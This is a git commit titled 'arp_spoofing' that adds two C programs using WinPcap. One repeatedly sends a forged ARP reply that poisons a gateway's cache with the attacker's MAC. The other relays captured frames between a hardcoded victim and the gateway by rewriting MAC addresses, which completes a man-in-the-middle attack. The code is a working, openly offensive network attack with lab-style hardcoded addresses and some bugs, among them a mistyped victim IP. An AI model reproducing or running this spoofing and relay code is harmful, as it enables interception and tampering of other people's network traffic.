f716c10c5eacfcee6b6cfe451f779c89b01e5afe
yeahmii98 <yeahmii98@users.noreply.github.com>
2020-01-07 09:38:53 +0900

    arp_spoofing

---
+++ attack_gateway.c
@@ -0,0 +1,189 @@
+#include <WinSock2.h>
+//htons(), htonl() 함수 사용
+#include <pcap.h>
+//네트워크 프로그래밍 함수를 제공
+//WinSock2.h는 항상 pcap.h보다 위에 있어야한다
+#include <stdio.h>
+#include <stdint.h>
+//여러 자료형을 정리하여 제공
+#include <string.h>
+
+
+#pragma warning(disable:4996)
+#pragma warning(disable:6011)
+
+#define ETH_LEN 6
+#define IP_LEN 4
+
+#define ETHERTYPE_ARP 0x0806
+
+
+//Wireshark를 참고하여 구조체를 만든다
+#pragma pack(push, 1)
+struct ether_header
+{
+	uint8_t dst_host[ETH_LEN];
+	uint8_t src_host[ETH_LEN];
+	uint16_t ether_type;
+};
+#pragma pack(pop)
+
+#pragma pack(push, 1)
+struct arp_header {
+	uint16_t hardware_type;
+	uint16_t protocol_type;
+	uint8_t hardware_size;
+	uint8_t protocol_size;
+	uint16_t opcode;
+	uint8_t sender_host[ETH_LEN];
+	uint8_t sender_ip[IP_LEN];
+	uint8_t target_host[ETH_LEN];
+	uint8_t target_ip[IP_LEN];
+}; 
+#pragma pack(pop)
+
+
+
+int main(void)
+{
+	struct ether_header eth;
+	struct arp_header arp;
+	pcap_if_t* allDev;
+	pcap_if_t* tempDev;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	unsigned char packet[1500];
+	pcap_t* _handle;
+	
+
+	int i = 0;
+	int select;
+	//모든 네트워크 장치를 가져오는 함수
+	if (pcap_findalldevs(&allDev, errbuf) == PCAP_ERROR)
+	{
+		printf("[ERROR] pcap_findalldevs() : %s\n", errbuf);
+		return NULL;
+	}
+
+	//장치는 연결리스트로 저장되어 있어 하나씩 불러와 화면에 출력
+	for (tempDev = allDev; tempDev != NULL; tempDev = tempDev->next) {
+		printf("%d. %s", ++i, tempDev->name);
+		if (tempDev->description)
+			printf(" (%s)\n", tempDev->description);
+		else printf("No description available\n");
+	}
+	//장치 선택후 임시 장치를 가리키는 tempDev 포인터 이동
+
+	printf("select interface number (1-%d) : ", i);
+	scanf_s("%d", &select);
+	if (select<1 || select>i) {
+		printf("\nInterface number out of range.\n");
+		pcap_freealldevs(allDev);
+		return -1;
+	}
+	for (tempDev = allDev, i = 0; i < select - 1; tempDev = tempDev->next, i++);
+	//선택된 장치의 핸들을 가져오는 함수, 핸들을 가져오고 모든 장치는 비활성화 해준다.
+
+	if ((_handle = pcap_open_live(tempDev->name, 65536, 1, 1000, errbuf)) == NULL) {
+		printf("  ");
+		pcap_freealldevs(allDev);
+		return -1;
+	}
+
+	/*	pcap_t* _handle = pcap_open(tempDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);
+	if (_handle == NULL) {
+	printf("[ERROR] pcap_open() : %s\n", errbuf);
+	return NULL;
+	}
+	pcap_freealldevs(allDev);
+	return _handle;*/
+
+	//패킷 버퍼 초기화
+	memset(packet, 0, sizeof(packet));
+	int length = 0;
+
+	//Ethernet Header 구성
+	//목적지
+	eth.dst_host[0] = 0x00;
+	eth.dst_host[1] = 0x01;
+	eth.dst_host[2] = 0x36;
+	eth.dst_host[3] = 0xf4;
+	eth.dst_host[4] = 0x54;
+	eth.dst_host[5] = 0x97;
+	//송신자
+	eth.src_host[0] = 0x00;
+	eth.src_host[1] = 0xe0;
+	eth.src_host[2] = 0x4c;
+	eth.src_host[3] = 0x61;
+	eth.src_host[4] = 0xc8;
+	eth.src_host[5] = 0x1f;
+
+	eth.ether_type = htons(ETHERTYPE_ARP); //3계층의 프로토콜 지정
+
+										   //패킷 버퍼에 저장
+	memcpy(packet, &eth, sizeof(eth));
+	length += sizeof(eth);
+
+	//arp 헤더 구성
+	arp.hardware_type = htons(0x0001);
+	arp.protocol_type = htons(0x0800);
+	arp.hardware_size = 0x06;
+	arp.protocol_size = 0x04;
+	arp.opcode = htons(0x0002);
+
+	//공격자 MAC
+	arp.sender_host[0] = 0x00;
+	arp.sender_host[1] = 0xe0;
+	arp.sender_host[2] = 0x4c;
+	arp.sender_host[3] = 0x61;
+	arp.sender_host[4] = 0xc8;
+	arp.sender_host[5] = 0x1f;
+
+	//피해자 IP
+	arp.sender_ip[0] = 196;
+	arp.sender_ip[1] = 168;
+	arp.sender_ip[2] = 25;
+	arp.sender_ip[3] = 16;
+
+
+	//게이트웨이 MAC
+	arp.target_host[0] = 0x00;
+	arp.target_host[1] = 0x01;
+	arp.target_host[2] = 0x36;
+	arp.target_host[3] = 0xf4;
+	arp.target_host[4] = 0x54;
+	arp.target_host[5] = 0x97;
+
+	//게이트웨이 IP
+	arp.target_ip[0] = 192;
+	arp.target_ip[1] = 168;
+	arp.target_ip[2] = 25;
+	arp.target_ip[3] = 1;
+
+	//arp 역시 패킷 버퍼에 저장해주깅
+	memcpy(packet + length, &arp, sizeof(arp));
+	length += sizeof(arp);
+
+	if (length < 64) {
+		for (i = length; i < 64; i++) {
+			packet[i] = 0;
+		}
+	}
+	if (_handle == NULL) {
+		printf("[ERROR] get_pcap_handle()\n");
+		return -1;
+	}
+
+	//패킷 전송하는 부분
+	//make_arp_reply(packet, &length);
+	while (1)
+	{
+		if (pcap_sendpacket(_handle, packet, length) != 0)
+		{
+			printf("SEND PACKET ERROR!\n");
+		}
+		printf("GATEWAY_ARP\n");
+		Sleep(10000);
+	}
+
+	return 0;
+}
---
+++ packet_relay.c
@@ -0,0 +1,172 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define _CRT_SECURE_NO_WARNINGS
+
+#include <winsock2.h>
+#include <pcap.h>
+#include <stdio.h>
+#include <string.h>
+
+#define MAC_ADDR_LEN 6
+#define IP_ADDR_LEN 4
+#define BUF_SIZE 100
+#define SNAPLEN 65536
+#define ARP_HEADER_JMP 14
+
+
+pcap_t *use_dev;
+
+//이더넷 헤더
+struct ethernet_header {
+	unsigned char dest_mac[MAC_ADDR_LEN];
+	unsigned char src_mac[MAC_ADDR_LEN];
+	unsigned short eth_type;
+};
+//arp 헤더
+struct arp_header {
+	unsigned short hardware_type;
+	unsigned short protocol_type;
+	unsigned char hardware_length;
+	unsigned char protocol_length;
+	unsigned short opcode;
+	unsigned char sender_mac[MAC_ADDR_LEN];
+	unsigned char sender_ip[IP_ADDR_LEN];
+	unsigned char target_mac[MAC_ADDR_LEN];
+	unsigned char target_ip[IP_ADDR_LEN];
+};
+
+//함수선언
+void print_ether_header(const unsigned char *pkt_data);
+void print_arp_header(const unsigned char *pkt_data);
+void callback(unsigned char *param, const struct pcap_pkthdr *header, const unsigned char *pkt_data);
+
+//main 시작
+int main(int argc, char **argv) {
+	//네트워크 장치 불러옴
+	pcap_if_t *alldevs = NULL;
+	pcap_if_t *dev;
+	
+	char errbuf[BUF_SIZE];
+	char FILTER_RULE[BUF_SIZE] = "arp";
+	struct bpf_program rule_struct;
+	int i, dev_num, res;
+	struct pcap_pkthdr *header;
+	const unsigned char *pkt_data;
+
+	if (argv[1]) {
+		strcpy(FILTER_RULE, "port ");
+		strcat(FILTER_RULE, argv[1]);
+	}
+
+	if (pcap_findalldevs(&alldevs, errbuf) < 0) {
+		printf("Device Find Error\n");
+		return -1;
+	}
+
+	for (dev = alldevs, i = 0; dev != NULL; dev = dev->next) {
+		printf("%d번 Device : %s (%s)\n", ++i, dev->name, dev->description);
+	}
+	printf("사용할 디바이스 번호 입력 : ");
+	scanf("%d", &dev_num);
+
+	for (dev = alldevs, i = 0; i < dev_num - 1; dev = dev->next, i++);
+
+	if ((use_dev = pcap_open_live(dev->name, SNAPLEN, 1, 1000, errbuf)) == NULL) {
+		printf("pcap_open ERROR!\n");
+		pcap_freealldevs(alldevs);
+		return -1;
+	}
+	printf("pcap_open 성공!\n");
+	printf("FILTER_FULE : %s\n", FILTER_RULE);
+
+	// pcap_open success!
+
+	if (pcap_compile(use_dev, &rule_struct, FILTER_RULE, 1, NULL) < 0) {
+		printf("pcap_compile ERROR!\n");
+		pcap_freealldevs(alldevs);
+		return -1;
+	}
+
+	if (pcap_setfilter(use_dev, &rule_struct) < 0) {
+		printf("pcap_setfilter ERROR!\n");
+		pcap_freealldevs(alldevs);
+		return -1;
+	}
+
+	pcap_freealldevs(alldevs);
+
+	while ((res = pcap_next_ex(use_dev, &header, &pkt_data)) >= 0) {
+		if (res == 0) continue;
+
+		print_ether_header(pkt_data);
+		pkt_data += ARP_HEADER_JMP;
+		print_arp_header(pkt_data);
+	}
+
+	pcap_loop(use_dev, 0, callback, NULL);
+	pcap_close(use_dev);
+
+	return 0;
+}
+//main 끝
+
+/////print 함수//////
+void print_ether_header(const unsigned char *pkt_data) {
+	struct ethernet_header *eh;
+	eh = (struct ethernet_header *)pkt_data;
+	unsigned short ether_type = ntohs(eh->eth_type);
+	if (ether_type == 0x0800) printf("======IPv4======");
+	printf("\n======ETHERNET======\n");
+	printf("Src MAC : \n");
+	for (int i = 0; i <= 5; i++) printf("%02x ", eh->src_mac[i]);
+	printf("Des MAC : ");
+	for (int i = 0; i <= 5; i++) printf("%02x ", eh->dest_mac[i]);
+	printf("\n");
+
+}
+
+void print_arp_header(const unsigned char *pkt_data) {
+	struct arp_header *ah;
+	ah = (struct arp_header *)pkt_data;
+	printf("======ARP=====\n");
+	printf("Sender MAC : ");
+	for (int i = 0; i <= 5; i++) printf("%02x ", ah->sender_mac[i]);
+	printf("\n Sender IP : ");
+	for (int i = 0; i <= 3; i++) printf("%d.", ah->sender_ip[i]);
+	printf("\nTarget MAC : ");
+	for (int i = 0; i <= 5; i++) printf("%02x ", ah->target_mac[i]);
+	printf("\n Target IP : \n");
+	for (int i = 0; i <= 3; i++) printf("%d.", ah->target_ip[i]);
+
+
+}
+/*공격자 ip : 192.168.25.15
+공격자 mac : 00:e0:4c:61:c8:1f
+피해자 ip : 192.168.25.16
+피해자 mac : 00.0c.29.18.38.4b
+
+gateway ip : 192.168.25.1
+gateway mac : 00.01.36.f4.54.97
+
+*/
+void callback(unsigned char *param, const struct pcap_pkthdr *header, const unsigned char *pkt_data) {
+	struct ethernet_header *eh;
+	eh = (struct ethernet_header *)pkt_data;
+
+	unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0x00,0x0c,0x29,0x18,0x38,0x4b };
+	unsigned char ATTACK_MAC[MAC_ADDR_LEN] = { 0x00,0xe0,0x4c,0x61,0xc8,0x1f };
+	unsigned char GATEWAY_MAC[MAC_ADDR_LEN] = { 0x00,0x01,0x36,0xf4,0x54,0x97 };
+
+	if ((memcmp(VICTIM_MAC, eh->src_mac, sizeof(eh->src_mac))) == 0) {
+		printf("VICTIM -> GATEWAY \n");
+		memcpy(eh->src_mac, ATTACK_MAC, sizeof(eh->src_mac));
+		memcpy(eh->dest_mac, GATEWAY_MAC, sizeof(eh->dest_mac));
+	}
+	if ((memcmp(GATEWAY_MAC, eh->src_mac, sizeof(eh->src_mac))) == 0)
+	{
+		printf("GATEWAY -> VICTIM\n");
+		memcpy(eh->src_mac, ATTACK_MAC, sizeof(eh->src_mac));
+		memcpy(eh->dest_mac, VICTIM_MAC, sizeof(eh->dest_mac));
+	}
+
+	pcap_sendpacket(use_dev, pkt_data, header->caplen);
+}
